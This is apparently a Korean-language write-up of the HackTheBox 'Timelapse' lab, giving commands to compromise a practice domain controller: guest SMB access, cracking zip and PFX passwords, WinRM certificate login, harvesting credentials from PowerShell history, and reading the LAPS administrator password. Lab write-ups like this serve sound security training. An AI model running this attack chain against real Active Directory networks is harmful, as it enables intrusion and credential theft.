# Timelapse - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,49667,49673,49674,49690,53,593,5986,636,88,9389 -sC -sV -vv -oA timelapse 10.10.11.152
```
<img width="1104" height="301" alt="image" src="https://github.com/user-attachments/assets/225fa720-b416-48e2-b75a-14ea5180d149" />
<img width="1104" height="211" alt="image" src="https://github.com/user-attachments/assets/c05f8545-6544-4beb-acc2-a3210f4cf161" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5986)

<br>

- `/etc/hosts`에 `dc01.timelapse.htb` 추가.
<img width="1104" height="65" alt="image" src="https://github.com/user-attachments/assets/0e6aac8b-ed2a-40be-a596-fac7ad7cb1d2" />

---
## SMB
- `guest`로그인 시도하여 SMB 확인.
- `winrm_backup.zip` 발견.
```bash
smbmap -u 'guest' -p '' -H 10.10.11.152 -r --depth=10
```
<img width="1104" height="81" alt="image" src="https://github.com/user-attachments/assets/c4194b63-3990-45df-bf4f-763d1d09f520" />

<br>
<br>

- 다운로드하여 압축해제하려 했으나 비밀번호 필요.
```bash
smbmap -u 'guest' -p '' -H 10.10.11.152 --download './Shares//Dev/winrm_backup.zip'
```
<img width="1104" height="81" alt="image" src="https://github.com/user-attachments/assets/cf8efd0c-f442-4d09-a41e-145a807cf166" />

<br>
<br>

- `zip2john`을 사용하여 해시화.
```bash
zip2john 10.10.11.152-Shares_Dev_winrm_backup.zip >hash
```
<img width="1104" height="91" alt="image" src="https://github.com/user-attachments/assets/af930d40-4e52-41f1-bd0d-a62d7f4a3013" />

<br>
<br>

- 해시화 된 파일의 파일명을 제거해준 뒤 크래킹.
```bash
hashcat -m 17220 hash ~/util/rockyou.txt 
```
<img width="1104" height="83" alt="image" src="https://github.com/user-attachments/assets/2a99209d-e6b9-451c-afa4-88f585d6db28" />

<br>
<br>

- 압축 해제하여 `legacyy_dev_auth.pfx`파일 획득.
<img width="1104" height="104" alt="image" src="https://github.com/user-attachments/assets/85d60146-7b21-43ed-9a8a-aaa59e3d9259" />

<br>
<br>

- pfx에서 비밀키를 추출하려고 시도하였으나 비밀번호 필요.
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out private.key
```
<img width="1104" height="95" alt="image" src="https://github.com/user-attachments/assets/7f145328-91ba-4998-94d3-ccb0e4062b75" />

<br>
<br>

- `pfx2john`을 사용하여 해시화.
```bash
pfx2john legacyy_dev_auth.pfx > hash2
```
<img width="1104" height="61" alt="image" src="https://github.com/user-attachments/assets/2a3449a6-7a3b-4e96-82ea-2bcdcf51917b" />

<br>
<br>

- `john`을 사용하여 크래킹.
```bash
john hash2 --wordlist=~/util/rockyou.txt
```
<img width="1105" height="262" alt="image" src="https://github.com/user-attachments/assets/5802e5af-f11c-45d8-a850-7c4eb5349bda" />

<br>
<br>

- `thuglegacy` 비밀번호를 사용하여 공개키와 비밀키로 변환.
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out private.key

openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -clcerts -out public.key
```
<img width="1105" height="152" alt="image" src="https://github.com/user-attachments/assets/65ce8ef0-0322-4ac7-8089-cb37cfcc51ea" />

## evil-winrm(secure)
- `evil-winrm` 접속.
```bash
evil-winrm -i 10.10.11.152 -c public.key -k private.key -S
```
<img width="1105" height="313" alt="image" src="https://github.com/user-attachments/assets/b1e8eec4-6014-47c3-b8d8-cfd4944595cb" />

---
## Privesc
- `PowerShell history` 파일이 존재하여 확인.
- `svc_deploy` 계정 획득.
```powershell
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

Test-Path $historyPath

Get-Content $historyPath
```
<img width="1105" height="291" alt="image" src="https://github.com/user-attachments/assets/7f552068-5f35-40ed-a57d-cf8b05863fa9" />

<br>
<br>

- `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV` 접속 가능.
```bash
nxc winrm 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```
<img width="1105" height="186" alt="image" src="https://github.com/user-attachments/assets/0bd2015c-71bc-4c3a-868f-52b92ce9faf2" />

<br>
<br>

- `evil-winrm` 접속.
```bash
evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```
<img width="1104" height="311" alt="image" src="https://github.com/user-attachments/assets/ab6b1093-da4b-4afb-b587-b4b3afef3456" />

<br>
<br>

- `SharpHound`를 사용하여 도메인 정보 수집.
```powershell
.\sharphound.exe

download 20260114233658_BloodHound.zip
```
<img width="1105" height="346" alt="image" src="https://github.com/user-attachments/assets/526880a3-9100-4836-bb91-707f1df6ca5e" />

<br>
<br>

- `bloodhound`를 사용하여 확인.
- `DC01`로 `ReadLAPSPassword`권한 확인.
<img width="1269" height="502" alt="image" src="https://github.com/user-attachments/assets/d4242bb7-2f9a-495e-921e-676770aafd63" />

<br>
<br>

- `bloodyAD`를 사용하여 `administrator` 비밀번호 획득.
```bash
bloodyAD --host 10.10.11.152 -d timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
<img width="1104" height="144" alt="image" src="https://github.com/user-attachments/assets/a22edebf-9fc3-4774-bc1c-d6976457e9bb" />

<br>
<br>

- `administrator:.uvwH4sue4H2X;]6+hxRd87-` 로그인 시도.
<img width="1104" height="185" alt="image" src="https://github.com/user-attachments/assets/72656d5f-519b-43b4-9f87-45d52186dfb2" />

<br>
<br>

- `evil-winrm` 로그인.
<img width="1104" height="311" alt="image" src="https://github.com/user-attachments/assets/a235efce-83a6-4506-b187-985d8ea083e3" />

---
## FLAG
- `c:\users\legacyy\desktop\user.txt`
<img width="1104" height="187" alt="image" src="https://github.com/user-attachments/assets/c819bb8d-09d1-4da6-bbb7-2a07b2ef591f" />

<br>
<br>

- `c:\users\trx\desktop\root.txt`
<img width="1104" height="187" alt="image" src="https://github.com/user-attachments/assets/42220ef6-ae70-4819-b2ea-bd44e9f87312" />
